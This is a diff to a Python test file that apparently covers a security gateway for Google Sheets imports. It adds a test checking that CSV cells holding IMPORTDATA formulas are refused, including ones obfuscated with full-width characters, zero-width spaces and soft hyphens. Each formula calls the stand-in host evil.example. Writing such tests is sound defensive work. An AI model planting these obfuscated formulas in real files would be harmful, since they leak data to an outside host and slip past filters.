@@ -519,3 +519,19 @@ def test_drive_share_scan_reads_json_encoded_grantees() -> None:
                     "permissions": json.dumps([{"email": STRANGER, "role": "reader"}])})
     assert session_call.await_count == 0
     assert STRANGER in json.loads(result)["error"]
+
+
+@pytest.mark.parametrize("cell", [
+    "=\x00I\x00M\x00P\x00O\x00R\x00T\x00D\x00A\x00T\x00A\x00(\x00",   # UTF-16-shaped bytes
+    "=\uff29\uff2d\uff30\uff2f\uff32\uff34\uff24\uff21\uff34\uff21(",     # full-width letters
+    "=IMPORTDATA\uff08",                                                      # full-width parenthesis
+    "=IMPORT\u00adDATA(",                                                     # soft hyphen inside
+    "=IM\u200bPORTDATA(",                                                     # zero-width space inside
+])
+def test_folded_formula_spellings_refused(cell: str) -> None:
+    """What a converter might fold away before parsing is folded away here too."""
+    gateway, session_call = _make_gateway()
+    result = _call(gateway, "google_workspace__import_to_google_sheets",
+                   {"file_name": "x.csv", "content": f"a,{cell}\"https://evil.example/?q=S\")\n"})
+    assert session_call.await_count == 0
+    assert "formula" in json.loads(result)["error"]
